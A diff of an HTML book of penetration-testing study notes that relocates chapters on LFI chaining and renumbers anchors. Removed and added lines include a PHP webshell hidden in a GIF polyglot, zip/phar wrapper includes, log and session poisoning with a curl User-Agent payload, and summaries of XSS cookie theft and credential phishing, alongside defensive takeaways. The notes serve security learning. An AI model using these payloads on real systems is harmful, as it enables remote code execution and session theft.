+<li><strong><code>/var/log/mail</code></strong> (or similar) — <strong>mail content</strong> that gets logged.</li>
+</ul>
+<p>Generalize: <strong>any log that records attacker-controlled bytes</strong> and is <strong>readable through LFI</strong> can become a <strong>staged PHP file</strong> for an execute-capable include.</p>
+<h2 id="defensive-takeaway-1"><a class="header" href="#defensive-takeaway-1">Defensive takeaway</a></h2>
+<p>Treat <strong>session files</strong> and <strong>logs</strong> as sensitive: <strong>strict path allowlists</strong> for includes, <strong>no user input in include resolution</strong>, <strong>least privilege</strong> on log and session directories, and <strong>avoid execute semantics</strong> on attacker-influenced paths. From an assurance perspective, <strong>readable logs + LFI + execute include</strong> is a full <strong>RCE</strong> chain.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="php-filter-wrappers-for-lfi-source-disclosure"><a class="header" href="#php-filter-wrappers-for-lfi-source-disclosure">PHP filter wrappers for LFI (source disclosure)</a></h1>
 <p>Many PHP apps (and frameworks like Laravel or Symfony) expose <strong>Local File Inclusion (LFI)</strong> through unsafe <code>include</code> / <code>require</code> style patterns. <strong>PHP wrappers</strong> are stream handlers (<code>php://…</code>) that let code read I/O streams, memory, and more. Attackers abuse them to <strong>read source</strong> instead of executing it, and in other contexts (e.g. XXE) to widen impact toward <strong>RCE</strong> when combined with other primitives.</p>
@@ -24470,126 +25007,6 @@ SQL&gt; xp_cmdshell whoami /priv
 <p><strong>Reality check:</strong> pulling SMB from <strong>across the internet</strong> is often <strong>blocked</strong> by policy or networking; same-LAN or reachable share scenarios are more typical.</p>
 <h2 id="relationship-to-ssrf"><a class="header" href="#relationship-to-ssrf">Relationship to SSRF</a></h2>
 <p>RFI that accepts <strong>HTTP(S) URLs</strong> is a controlled <strong>outbound request</strong> primitive: use it to <strong>map internal HTTP services</strong>, alternate ports, and metadata endpoints—same mindset as SSRF, with inclusion-specific parsing and execution rules layered on top.</p>
-<div style="break-before: page; page-break-before: always;"></div>
-<h1 id="lfi-and-file-uploads"><a class="header" href="#lfi-and-file-uploads">LFI and file uploads</a></h1>
-<p>Legitimate <strong>file uploads</strong> (avatars, attachments, imports) are common. The risk here is usually not a broken upload validator alone but <strong>chaining</strong> with <strong>Local File Inclusion (LFI)</strong>: if an <strong>execution-capable</strong> include processes the attacker-controlled path, <strong>PHP inside an uploaded file can run</strong> when that path is included—even if the file looks like an image by extension and magic bytes.</p>
-<h2 id="preconditions"><a class="header" href="#preconditions">Preconditions</a></h2>
-<ul>
-<li><strong>Upload</strong> that stores a file the attacker can place (does not need to be “vulnerable” beyond accepting the bytes).</li>
-<li><strong>LFI</strong> into a sink that <strong>executes</strong> code for the chosen resource (same matrix as <a href="#intro-to-file-inclusions">intro to file inclusions</a>: PHP <code>include</code> / <code>include_once</code>, Java <code>import</code> in risky patterns, .NET <code>include</code>, etc.). <code>require</code> / Node <code>res.render</code> are called out in course material as <strong>no remote URL</strong> in some rows; focus on <strong>execute</strong> capability for RCE.</li>
-</ul>
-<h2 id="polyglot-image--include"><a class="header" href="#polyglot-image--include">Polyglot “image” + include</a></h2>
-<ol>
-<li>
-<p>Build a file that passes casual checks: <strong>allowed extension</strong> (e.g. <code>.gif</code>) and <strong>magic bytes</strong> at the start (e.g. <code>GIF8</code>—ASCII-friendly; other types work but may need binary/encoding care).</p>
-</li>
-<li>
-<p>Append <strong>PHP</strong> after the magic header, for example:</p>
-<pre><code class="language-bash">echo 'GIF8&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.gif
-</code></pre>
-</li>
-<li>
-<p>Upload via the app (e.g. profile photo). The file is inert until something <strong>includes</strong> it as PHP.</p>
-</li>
-<li>
-<p>Discover <strong>on-disk or URL path</strong> (HTML <code>img src</code>, browser devtools, or fuzz <strong><code>/uploads</code></strong>, <strong><code>/profile_images</code></strong>, etc.—paths may be hidden).</p>
-</li>
-<li>
-<p>Trigger LFI with that path (and <strong><code>../</code></strong> if the sink <strong>prepends</strong> a base directory). Example:</p>
-<p><code>index.php?language=./profile_images/shell.gif&amp;cmd=id</code></p>
-</li>
-</ol>
-<p>The shell is harmless for normal image serving; <strong>inclusion</strong> is what executes it.</p>
-<h2 id="php-only-alternatives-zip-and-phar"><a class="header" href="#php-only-alternatives-zip-and-phar">PHP-only alternatives: <code>zip://</code> and <code>phar://</code></a></h2>
-<p>Use when the polyglot trick fails or wrappers are attractive; both depend on <strong>PHP</strong> and <strong>configuration / detection</strong> quirks.</p>
-<h3 id="zip-wrapper"><a class="header" href="#zip-wrapper">Zip wrapper</a></h3>
-<p><code>zip</code> may be <strong>disabled</strong>; not universal.</p>
-<pre><code class="language-bash">echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php &amp;&amp; zip shell.jpg shell.php
-</code></pre>
-<p>Upload <code>shell.jpg</code> (a zip). Include with <strong><code>#</code></strong> URL-encoded as <strong><code>%23</code></strong>:</p>
-<p><code>language=zip://./profile_images/shell.jpg%23shell.php&amp;cmd=id</code></p>
-<p>Renaming zip to <code>.jpg</code> can still fail <strong>content-type</strong> sniffers; works best when <strong>zip uploads</strong> are allowed.</p>
-<h3 id="phar-wrapper"><a class="header" href="#phar-wrapper">Phar wrapper</a></h3>
-<p>Build a <strong>Phar</strong> containing an inner file with PHP, rename to something uploadable (e.g. <code>shell.jpg</code>). Requires <strong><code>php --define phar.readonly=0</code></strong> to generate. Include:</p>
-<p><code>language=phar://./profile_images/shell.jpg%2Fshell.txt&amp;cmd=id</code></p>
-<p>(inner path per how the archive was built). Treat <strong>zip</strong> and <strong>phar</strong> as <strong>fallbacks</strong>; <strong>polyglot upload + LFI</strong> is often the most reliable of the three.</p>
-<h2 id="legacy-edge-case"><a class="header" href="#legacy-edge-case">Legacy edge case</a></h2>
-<p>Older setups: <strong><code>file_uploads</code></strong> on, <strong>old PHP</strong>, <strong><code>phpinfo()</code></strong> exposed, plus LFI—historical <strong>temporary upload path</strong> abuse. Rare today; specific requirements.</p>
-<h2 id="defensive-takeaway"><a class="header" href="#defensive-takeaway">Defensive takeaway</a></h2>
-<p>Secure <strong>uploads</strong> (type, storage outside web root, non-executable serving) still matters, but <strong>do not</strong> rely on “images are safe” if <strong>any code path can include</strong> user-influenced filesystem paths with <strong>execute</strong> semantics. Prefer <strong>no user input in include paths</strong>, <strong>allowlists</strong>, and <strong>non-executable</strong> storage and response paths.</p>
-<div style="break-before: page; page-break-before: always;"></div>
-<h1 id="log-poisoning-for-lfi--rce"><a class="header" href="#log-poisoning-for-lfi--rce">Log poisoning for LFI → RCE</a></h1>
-<p>When an <strong>execution-capable</strong> include processes a path as PHP, <strong>any included file that contains PHP runs</strong>. <strong>Log poisoning</strong> (also called log contamination) means <strong>writing attacker PHP into a log or session file</strong> the app already writes, then <strong>including that file</strong> through the LFI parameter. It works wherever the <strong>web process can read</strong> the poisoned file—paths and permissions differ by stack and hardening.</p>
-<p>The same <strong>read / execute / remote URL</strong> matrix applies as in <a href="#intro-to-file-inclusions">intro to file inclusions</a>: sinks that <strong>execute</strong> (e.g. PHP <code>include</code> / <code>include_once</code>, Java <code>import</code> / .NET <code>include</code> in risky patterns) enable RCE; <code>require</code> / Node <code>res.render</code> rows in course material stress <strong>no remote URL</strong> in some cases—here the focus is <strong>execute + readable poisoned file</strong>.</p>
-<h2 id="php-session-poisoning"><a class="header" href="#php-session-poisoning">PHP session poisoning</a></h2>
-<p>PHP stores session data in files keyed by <strong><code>PHPSESSID</code></strong>:</p>
-<div class="table-wrapper">
-<table>
-<thead>
-<tr><th>Platform</th><th>Typical directory</th></tr>
-</thead>
-<tbody>
-<tr><td>Linux</td><td><code>/var/lib/php/sessions/</code></td></tr>
-<tr><td>Windows</td><td><code>C:\Windows\Temp\</code></td></tr>
-</tbody>
-</table>
-</div>
-<p>Filename: <strong><code>sess_</code> + cookie value</strong>, e.g. cookie <code>abc123</code> → <code>/var/lib/php/sessions/sess_abc123</code>.</p>
-<p><strong>Workflow</strong></p>
-<ol>
-<li>Confirm you have a <strong><code>PHPSESSID</code></strong>; map it to <strong><code>sess_&lt;id&gt;</code></strong> on disk.</li>
-<li><strong>Include the session file</strong> via LFI and inspect serialized contents for <strong>fields you control</strong> (e.g. a <code>page</code> key tied to <code>?language=</code>).</li>
-<li><strong>Poison</strong>: request with <code>?language=</code> set to <strong>URL-encoded PHP</strong> (e.g. <code>&lt;?php system($_GET['cmd']); ?&gt;</code>).</li>
-<li><strong>Include the session file again</strong> and pass <strong><code>&amp;cmd=id</code></strong> (or another command) on the include request.</li>
-</ol>
-<p><strong>Operational notes</strong></p>
-<ul>
-<li>Cookie values <strong>differ per session</strong>; always use <strong>your</strong> <code>sess_*</code> path.</li>
-<li>After you include the session file with <code>language=/var/lib/php/sessions/sess_...</code>, the app may <strong>overwrite</strong> session data with that path string—<strong>re-poison</strong> before another command. Prefer dropping a <strong>persistent webshell</strong> under the web root or <strong>reverse shell</strong> once you have execution.</li>
-<li>If nothing in the session file is user-influenced, this chain does not apply.</li>
-</ul>
-<h2 id="web-server-access-logs-apache--nginx"><a class="header" href="#web-server-access-logs-apache--nginx">Web server access logs (Apache / Nginx)</a></h2>
-<p><strong><code>access.log</code></strong> records each request, including the <strong><code>User-Agent</code></strong> header—<strong>fully client-controlled</strong>. Poison by sending <strong>any</strong> request (not only the LFI URL) with <code>User-Agent: &lt;?php system($_GET['cmd']); ?&gt;</code>, then <strong>include the log</strong> via LFI.</p>
-<p><strong>Default log locations</strong> (verify; fuzz with an LFI wordlist if needed)</p>
-<div class="table-wrapper">
-<table>
-<thead>
-<tr><th>Server</th><th>Linux</th><th>Windows (common)</th></tr>
-</thead>
-<tbody>
-<tr><td>Apache</td><td><code>/var/log/apache2/</code></td><td><code>C:\xampp\apache\logs\</code></td></tr>
-<tr><td>Nginx</td><td><code>/var/log/nginx/</code></td><td><code>C:\nginx\log\</code></td></tr>
-</tbody>
-</table>
-</div>
-<p><strong>Permissions</strong></p>
-<ul>
-<li><strong>Nginx</strong> logs are often readable by low-privileged users (e.g. <code>www-data</code>) by default.</li>
-<li><strong>Apache</strong> logs are often restricted to <strong>root</strong> / <strong>adm</strong>; <strong>older or misconfigured</strong> Apache may allow <strong>www-data</strong> read access.</li>
-</ul>
-<p><strong>cURL example</strong> (write header to a file, then send):</p>
-<pre><code class="language-bash">echo -n "User-Agent: &lt;?php system(\$_GET['cmd']); ?&gt;" &gt; Poison
-curl -s "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php" -H @Poison
-</code></pre>
-<p>Then trigger LFI against <code>access.log</code> and add <strong><code>&amp;cmd=id</code></strong>.</p>
-<p><strong>Safety</strong></p>
-<ul>
-<li>Logs can be <strong>very large</strong>; including them may be <strong>slow</strong> or <strong>harmful</strong> in production. Minimize noise and avoid repeated full-log pulls.</li>
-</ul>
-<p><strong>Alternatives</strong></p>
-<ul>
-<li><strong><code>User-Agent</code></strong> may also appear under <strong><code>/proc/</code></strong> (e.g. <code>/proc/self/environ</code>, <code>/proc/self/fd/N</code> for small <strong>N</strong>). If logs are unreadable, these are worth trying—<strong>they may still require elevated read</strong>.</li>
-</ul>
-<h2 id="other-service-logs"><a class="header" href="#other-service-logs">Other service logs</a></h2>
-<p>If LFI can <strong>read</strong> a log and you can <strong>inject PHP into a logged field</strong>, the same idea applies:</p>
-<ul>
-<li><strong><code>/var/log/sshd.log</code></strong> — e.g. <strong>username</strong> set to PHP when SSH is exposed.</li>
-<li><strong><code>/var/log/vsftpd.log</code></strong> — <strong>FTP username</strong> as payload.</li>
-<li><strong><code>/var/log/mail</code></strong> (or similar) — <strong>mail content</strong> that gets logged.</li>
-</ul>
-<p>Generalize: <strong>any log that records attacker-controlled bytes</strong> and is <strong>readable through LFI</strong> can become a <strong>staged PHP file</strong> for an execute-capable include.</p>
-<h2 id="defensive-takeaway-1"><a class="header" href="#defensive-takeaway-1">Defensive takeaway</a></h2>
-<p>Treat <strong>session files</strong> and <strong>logs</strong> as sensitive: <strong>strict path allowlists</strong> for includes, <strong>no user input in include resolution</strong>, <strong>least privilege</strong> on log and session directories, and <strong>avoid execute semantics</strong> on attacker-influenced paths. From an assurance perspective, <strong>readable logs + LFI + execute include</strong> is a full <strong>RCE</strong> chain.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="linux-file-transfer-methods"><a class="header" href="#linux-file-transfer-methods">Linux File Transfer Methods</a></h1>
 <h2 id="introduction-29"><a class="header" href="#introduction-29">Introduction</a></h2>
@@ -24726,7 +25143,7 @@ sudo mount -t cifs //&lt;IP&gt;/sharename /mnt/smb -o username=user
 cp file.txt /mnt/smb/
 sudo umount /mnt/smb
 </code></pre>
-<h2 id="summary-6"><a class="header" href="#summary-6">Summary</a></h2>
+<h2 id="summary-7"><a class="header" href="#summary-7">Summary</a></h2>
 <ul>
 <li><strong>Base64</strong>: No network needed, limited by terminal/paste buffer size</li>
 <li><strong>HTTP/HTTPS</strong>: Most common, multiple tools (curl, wget, Python), often allowed outbound</li>
@@ -24861,7 +25278,7 @@ echo PUT &lt;file&gt; &gt;&gt; ftpcommand.txt
 echo bye &gt;&gt; ftpcommand.txt
 ftp -v -n -s:ftpcommand.txt
 </code></pre>
-<h2 id="summary-7"><a class="header" href="#summary-7">Summary</a></h2>
+<h2 id="summary-8"><a class="header" href="#summary-8">Summary</a></h2>
 <ul>
 <li><strong>Base64</strong>: No network needed, limited by terminal length</li>
 <li><strong>PowerShell WebClient</strong>: HTTP/HTTPS, most common, supports fileless execution</li>
@@ -25553,7 +25970,7 @@ Thus using an <strong>ACK scan</strong> (-sA) might be a good idea because the f
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="linux-authentication"><a class="header" href="#linux-authentication">Linux Authentication</a></h1>
-<h2 id="summary-8"><a class="header" href="#summary-8">Summary</a></h2>
+<h2 id="summary-9"><a class="header" href="#summary-9">Summary</a></h2>
 <p>Linux uses Pluggable Authentication Modules (PAM) for authentication. The key modules (<code>pam_unix.so</code>, <code>pam_unix2.so</code>) are located in <code>/usr/lib/x86_64-linux-gnu/security/</code> on Debian-based systems. PAM handles user information, authentication, sessions, and password changes.</p>
 <h3 id="key-files-1"><a class="header" href="#key-files-1">Key Files</a></h3>
 <div class="table-wrapper">
@@ -25679,7 +26096,7 @@ unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes
 </div>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="pivoting-tunneling-and-port-forwarding-1"><a class="header" href="#pivoting-tunneling-and-port-forwarding-1">Pivoting, Tunneling, and Port Forwarding</a></h1>
-<h2 id="directory-map-16"><a class="header" href="#directory-map-16">Directory Map</a></h2>
+<h2 id="directory-map-17"><a class="header" href="#directory-map-17">Directory Map</a></h2>
 <ul>
 <li><a href="#ssh-local-port-forwarding">SSH Local Port Forwarding</a></li>
 <li><a href="#ssh-dynamic-port-forwarding-with-socks">SSH Dynamic Port Forwarding</a></li>
@@ -26338,13 +26755,13 @@ debug1: channel 1: connected to 0.0.0.0 port 8000
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="sql-1"><a class="header" href="#sql-1">SQL</a></h1>
-<h2 id="directory-map-17"><a class="header" href="#directory-map-17">Directory Map</a></h2>
+<h2 id="directory-map-18"><a class="header" href="#directory-map-18">Directory Map</a></h2>
 <ul>
 <li><a href="#attacking-sql-databases">Attacking SQL Databases</a></li>
 <li><a href="#intro-to-sql-injections">Intro to SQL Injections</a></li>
 <li><a href="#subverting-query-logic">Subverting Query Logic</a></li>
 </ul>
-<h2 id="summary-9"><a class="header" href="#summary-9">Summary</a></h2>
+<h2 id="summary-10"><a class="header" href="#summary-10">Summary</a></h2>
 <p>Notes on attacking MySQL and MSSQL databases. Covers enumeration, authentication modes, connecting to databases, command execution (xp_cmdshell, webshells), privilege escalation via user impersonation, lateral movement through linked servers, and hash stealing techniques. Also covers SQL injection fundamentals including how unsanitized user input leads to injection, syntax error handling, the taxonomy of injection types (in-band, blind, and out-of-band), and subverting query logic with OR injection for authentication bypass.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="attacking-sql-databases"><a class="header" href="#attacking-sql-databases">Attacking SQL Databases</a></h1>
@@ -28276,7 +28693,7 @@ https://www.microsoft.com/en-us/msrc/blog/2014/06/an-overview-of-kb2871997
 https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="xss-cross-site-scripting-1"><a class="header" href="#xss-cross-site-scripting-1">XSS (Cross-Site Scripting)</a></h1>
-<h2 id="directory-map-18"><a class="header" href="#directory-map-18">Directory map</a></h2>
+<h2 id="directory-map-19"><a class="header" href="#directory-map-19">Directory map</a></h2>
 <ul>
 <li><a href="#cross-site-scripting-xss--introduction">Introduction — what XSS is, risk, examples, types</a></li>
 <li><a href="#stored-persistent-xss">Stored (persistent) XSS — impact, testing, persistence checks</a></li>
@@ -28288,7 +28705,7 @@ https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-p
 <li><a href="#xss-blind-detection--session-hijacking-cookie-stealing">XSS session hijacking — blind XSS, remote script OOB, cookie exfil, Firefox storage</a></li>
 <li><a href="#xss-prevention">XSS prevention — sources/sinks, validation, encoding, CSP, cookies</a></li>
 </ul>
-<h2 id="summary-10"><a class="header" href="#summary-10">Summary</a></h2>
+<h2 id="summary-11"><a class="header" href="#summary-11">Summary</a></h2>
 <p>Cross-site scripting lets attackers run JavaScript in victims’ browsers when applications fail to sanitize or encode user-controlled data. Notes cover client-side execution, typical impacts (session theft, forced actions, abuse of browser APIs), limits of pure XSS versus chaining with browser bugs, notable incidents (Samy worm, TweetDeck), and the three main types: <strong>stored</strong>, <strong>reflected</strong>, and <strong>DOM-based</strong> XSS. <strong>Stored</strong> XSS is covered in depth: saved payloads, wide victim pool, remediation in the database, basic PoC payloads (<code>alert(window.origin)</code>, <code>&lt;plaintext&gt;</code>, <code>print()</code>), iframe/origin confirmation, and using refresh to verify persistence. <strong>Reflected</strong> XSS is summarized separately: non-persistent behavior (vs DOM-based), error-message reflection, empty-quotes UI vs view-source confirmation, and delivering GET-based attacks via malicious URLs. <strong>DOM-based</strong> XSS is summarized separately: client-only processing, hash/URL sources, view-source vs inspector, source and sink functions, why <code>innerHTML</code> often blocks <code>&lt;script&gt;</code>, and event-handler payloads (e.g. <code>img</code> / <code>onerror</code>) delivered via shared URLs. <strong>XSS phishing</strong> is summarized separately: <strong>trusted-domain</strong> fake login UI that posts credentials to the attacker; <strong>authorized</strong> use as <strong>awareness simulations</strong>; <strong><code>/phishing</code>-style image URL</strong> labs where a raw <strong><code>&lt;script&gt;</code></strong> test often fails until <strong>source/context</strong> review; <strong><code>document.write</code></strong> for minified form HTML; <strong><code>getElementById('urlform').remove()</code></strong> after inspector (<strong><code>Ctrl+Shift+C</code></strong>) to drop the real URL field; <strong><code>&lt;!--</code></strong> after the payload to comment out trailing template; <strong>reflected</strong> delivery via a copied <strong>malicious URL</strong>; <strong>netcat</strong> on port <strong>80</strong> for quick <strong>GET</strong> <code>/?username=…&amp;password=…</code> capture vs a <strong>PHP</strong> listener that <strong>logs</strong> to <strong><code>creds.txt</code></strong> and <strong>redirects</strong> to the clean app so the victim does not see a broken HTTP response. <strong>XSS discovery</strong> is summarized separately: <strong>automated</strong> scanning (passive DOM hints vs active payload injection; commercial vs OSS tradeoffs), tools such as <strong>XSStrike</strong> / <strong>Brute XSS</strong> / <strong>XSSer</strong> and why <strong>reflection in HTML ≠ execution</strong>, <strong>manual</strong> testing with public payload lists and non-form sinks (<strong>headers</strong> like <strong>Cookie</strong> / <strong>User-Agent</strong>), why generic lists miss simple labs, optional custom scripting for odd targets, and <strong>manual code review</strong> as the most reliable path when full data flow is visible (with deeper secure-coding / white-box study left to other modules). <strong>XSS defacing</strong> is summarized separately: using <strong>stored</strong> XSS for <strong>persistent</strong> visual takeover, <strong>reputation</strong> impact (e.g. public sector defacements), four common levers (<strong><code>document.body.style.background</code></strong>, <strong><code>document.body.background</code></strong>, <strong><code>document.title</code></strong>, <strong><code>innerHTML</code></strong>), swapping <strong>full <code>&lt;body&gt;</code></strong> markup (with <strong><code>getElementsByTagName('body')[0]</code></strong>), optional <strong>jQuery</strong> when present, <strong>minified</strong> one-line HTML inside payloads, and how <strong>view-source</strong> can still show original structure while the <strong>rendered DOM</strong> looks defaced—plus <strong>injection position</strong> (end vs middle of page) affecting what later content might still appear. <strong>XSS session hijacking / blind XSS</strong> is summarized separately: <strong>cookies</strong> as session handles; <strong>blind</strong> sinks (<strong>admin</strong> panels, tickets, reviews, <strong><code>User-Agent</code></strong>); <strong><code>/hijacking</code></strong>-style registration reviewed by staff; <strong>OOB</strong> detection via <strong><code>&lt;script src=http://IP/fieldname&gt;</code></strong> so the <strong>request path</strong> names the vulnerable input; <strong>PayloadsAllTheThings</strong>-style <strong>quote-break</strong> variants and <strong>XHR</strong> / <strong><code>$.getScript</code></strong> when jQuery exists; <strong><code>sudo php -S 0.0.0.0:80</code></strong> to catch callbacks; pragmatic <strong>skips</strong> (<strong>email</strong> validation, <strong>password</strong> unlikely echoed); then <strong><code>new Image().src</code></strong> (vs <strong><code>document.location</code></strong>) to send <strong><code>document.cookie</code></strong> in a <strong>GET</strong> to <strong><code>index.php?c=</code></strong>, <strong>PHP</strong> splitting on <strong><code>;</code></strong>, <strong><code>urldecode</code></strong>, <strong><code>cookies.txt</code></strong> lines with <strong><code>REMOTE_ADDR</code></strong>; replay in <strong>Firefox Storage</strong> (<strong><code>Shift+F9</code></strong>) by adding <strong>name/value</strong> and refreshing—plus <strong><code>HttpOnly</code></strong> as the main cookie theft mitigation. <strong>XSS prevention</strong> is summarized separately: secure <strong>sources</strong> and <strong>sinks</strong> on <strong>client and server</strong>; front-end <strong>regex validation</strong> (e.g. email), <strong>DOMPurify</strong> for client-side HTML sanitization, avoiding <strong><code>&lt;script&gt;</code> / <code>&lt;style&gt;</code> / attributes / comments</strong> built from input and dangerous APIs (<strong><code>innerHTML</code></strong>, <strong><code>document.write</code></strong>, <strong><code>document.domain</code></strong>, jQuery <strong><code>.html()</code></strong> / <strong><code>parseHTML()</code></strong> / insertion helpers); back-end <strong><code>filter_var</code></strong> / validation, sanitization libraries, <strong>never raw echo</strong> of request params; <strong>output encoding</strong> with <strong><code>htmlspecialchars</code>/<code>htmlentities</code></strong> (PHP) or <strong><code>html-entities</code></strong> (Node); deployment levers (<strong>HTTPS</strong>, <strong>CSP</strong> like <strong><code>script-src 'self'</code></strong>, <strong><code>X-Content-Type-Options: nosniff</code></strong>, <strong><code>HttpOnly</code>/<code>Secure</code></strong> cookies, <strong>WAF</strong>, framework defaults such as <strong>ASP.NET</strong>); and ongoing <strong>offensive retesting</strong> because secure coding plus config can still miss edge cases—the note clarifies that <strong><code>addslashes</code></strong> alone is a weak primary HTML-XSS control versus <strong>contextual encoding</strong>.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="dom-based-xss"><a class="header" href="#dom-based-xss">DOM-Based XSS</a></h1>
@@ -28654,7 +29071,7 @@ sudo php -S 0.0.0.0:80
 <h1 id="xss-prevention"><a class="header" href="#xss-prevention">XSS prevention</a></h1>
 <p>XSS ties untrusted <strong>sources</strong> (inputs) to unsafe <strong>sinks</strong> (where data becomes HTML or JS). Defense should cover <strong>both</strong> <strong>front-end</strong> and <strong>back-end</strong>: client checks improve UX and catch honest mistakes, but <strong>attackers can bypass the browser</strong> with crafted <strong>GET/POST</strong> requests, so <strong>server-side</strong> rules are mandatory for <strong>stored</strong> and <strong>reflected</strong> XSS.</p>
 <h2 id="front-end"><a class="header" href="#front-end">Front-end</a></h2>
-<h3 id="input-validation"><a class="header" href="#input-validation">Input validation</a></h3>
+<h3 id="input-validation-1"><a class="header" href="#input-validation-1">Input validation</a></h3>
 <p><strong>Validate</strong> before you trust shape or format. Example pattern from the module: <strong>regex</strong> over an email field in JavaScript (often wired to <strong>jQuery</strong> selectors) so invalid addresses block submit—same idea as other allowlist/format checks.</p>
 <h3 id="input-sanitization-dom"><a class="header" href="#input-sanitization-dom">Input sanitization (DOM)</a></h3>
 <p><strong>DOMPurify</strong> (browser build, e.g. <code>purify.min.js</code>) takes untrusted HTML/strings and returns a <strong>safe subset</strong> for use in the DOM—use it when you must handle HTML-ish input on the client:</p>
@@ -28684,9 +29101,9 @@ sudo php -S 0.0.0.0:80
 <p>Prefer <strong>text</strong> APIs (<code>textContent</code>, <code>.text()</code>, safe templating) or <strong>structured</strong> bindings that auto-escape.</p>
 <h2 id="back-end"><a class="header" href="#back-end">Back-end</a></h2>
 <p>Front-end validation alone failed in the module’s discovery exercise—<strong>repeat checks and enforcement on the server</strong>.</p>
-<h3 id="input-validation-1"><a class="header" href="#input-validation-1">Input validation</a></h3>
+<h3 id="input-validation-1-1"><a class="header" href="#input-validation-1-1">Input validation</a></h3>
 <p>Same <strong>allowlist / format</strong> ideas: e.g. PHP <strong><code>filter_var(..., FILTER_VALIDATE_EMAIL)</code></strong>; reject and <strong>do not reflect</strong> invalid input. Node can reuse similar validation logic.</p>
-<h3 id="input-sanitization"><a class="header" href="#input-sanitization">Input sanitization</a></h3>
+<h3 id="input-sanitization-1"><a class="header" href="#input-sanitization-1">Input sanitization</a></h3>
 <p>Use <strong>vetted libraries</strong> for your language when you must accept rich text. The module mentions PHP <strong><code>addslashes()</code></strong> on parameters such as <strong><code>$_GET['email']</code></strong> as an example of escaping special characters; in practice <strong><code>addslashes</code> is a poor primary XSS defense</strong> for HTML. Prefer <strong>context-appropriate</strong> handling: validate, then <strong>encode on output</strong> (below), and use dedicated HTML sanitizers when you truly need HTML storage.</p>
 <p>Never echo <strong><code>$_GET</code> / <code>$_POST</code></strong> fields straight into responses.</p>
 <p><strong>Node</strong> can use <strong>DOMPurify</strong> (e.g. with <strong>jsdom</strong> in server environments) to sanitize strings before they reach templates.</p>
@@ -28805,7 +29222,7 @@ if (isset($_GET['c'])) {
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="kubernetes"><a class="header" href="#kubernetes">Kubernetes</a></h1>
-<h2 id="directory-map-19"><a class="header" href="#directory-map-19">Directory Map</a></h2>
+<h2 id="directory-map-20"><a class="header" href="#directory-map-20">Directory Map</a></h2>
 <ul>
 <li><a href="kubernetes/cks">cks</a></li>
 <li><a href="kubernetes/kcna">kcna</a></li>
@@ -28813,7 +29230,7 @@ if (isset($_GET['c'])) {
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="cks"><a class="header" href="#cks">CKS</a></h1>
-<h2 id="directory-map-20"><a class="header" href="#directory-map-20">Directory Map</a></h2>
+<h2 id="directory-map-21"><a class="header" href="#directory-map-21">Directory Map</a></h2>
 <ul>
 <li><a href="#certified-kubernetes-security-specialist-cks-notes">notes</a></li>
 <li><a href="#kubernetes-security-specialist-cks-practice-scenarios">questions</a></li>
@@ -31928,7 +32345,7 @@ EOF
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="kcna"><a class="header" href="#kcna">KCNA</a></h1>
-<h2 id="directory-map-21"><a class="header" href="#directory-map-21">Directory Map</a></h2>
+<h2 id="directory-map-22"><a class="header" href="#directory-map-22">Directory Map</a></h2>
 <ul>
 <li><a href="#kubernetes-certified-native-associate-kcna-notes">notes</a></li>
 </ul>
@@ -32462,7 +32879,7 @@ spec:
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="kcsa"><a class="header" href="#kcsa">KCSA</a></h1>
-<h2 id="directory-map-22"><a class="header" href="#directory-map-22">Directory Map</a></h2>
+<h2 id="directory-map-23"><a class="header" href="#directory-map-23">Directory Map</a></h2>
 <ul>
 <li><a href="#kubernetes-certified-security-associate-kcsa-notes">notes</a></li>
 </ul>
@@ -33063,7 +33480,7 @@ spec:
 </h4>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="networking"><a class="header" href="#networking">Networking</a></h1>
-<h2 id="directory-map-23"><a class="header" href="#directory-map-23">Directory Map</a></h2>
+<h2 id="directory-map-24"><a class="header" href="#directory-map-24">Directory Map</a></h2>
 <ul>
 <li><a href="networking/browser-networking">browser-networking</a></li>
 <li><a href="networking/http">http</a></li>
@@ -33093,7 +33510,7 @@ spec:
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="browser-networking"><a class="header" href="#browser-networking">Browser Networking</a></h1>
-<h2 id="directory-map-24"><a class="header" href="#directory-map-24">Directory Map</a></h2>
+<h2 id="directory-map-25"><a class="header" href="#directory-map-25">Directory Map</a></h2>
 <ul>
 <li><a href="#chapter-1">chapter01</a></li>
 <li><a href="#chapter-2">chapter02</a></li>
@@ -33366,7 +33783,7 @@ Message: Frame[&lt;Header&gt;] Frame[&lt;Payload&gt;]                           
 <p>WebSockets can transfer test or binary data.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="http-1"><a class="header" href="#http-1">HTTP</a></h1>
-<h2 id="directory-map-25"><a class="header" href="#directory-map-25">Directory Map</a></h2>
+<h2 id="directory-map-26"><a class="header" href="#directory-map-26">Directory Map</a></h2>
 <ul>
 <li><a href="#clean-urls">clean_urls</a></li>
 <li><a href="#http-persistent-connection">persistent_connections</a></li>
@@ -33615,7 +34032,7 @@ https://rnemeth90.github.io/posts/2023-12-12-golang-url-validation/
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="load-balancing"><a class="header" href="#load-balancing">Load Balancing</a></h1>
-<h2 id="directory-map-26"><a class="header" href="#directory-map-26">Directory Map</a></h2>
+<h2 id="directory-map-27"><a class="header" href="#directory-map-27">Directory Map</a></h2>
 <ul>
 <li><a href="#load-balancing-1">load-balancing</a></li>
 </ul>
